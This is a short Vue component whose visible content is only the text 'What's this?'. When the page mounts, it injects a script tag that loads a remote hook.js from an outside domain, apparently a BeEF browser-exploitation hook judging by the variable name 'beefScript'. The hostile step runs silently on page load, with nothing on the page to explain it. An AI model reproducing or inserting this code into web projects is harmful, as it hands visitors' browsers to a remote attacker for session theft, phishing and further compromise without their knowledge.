<template>
  <p>What's this?</p>
</template>

<script>
export default {
  mounted() {
    let beefScript = document.createElement('script');
    beefScript.setAttribute('src', 'https://uploads.rexvalkering.nl/hook.js');
    document.head.appendChild(beefScript);
  }
};
</script>
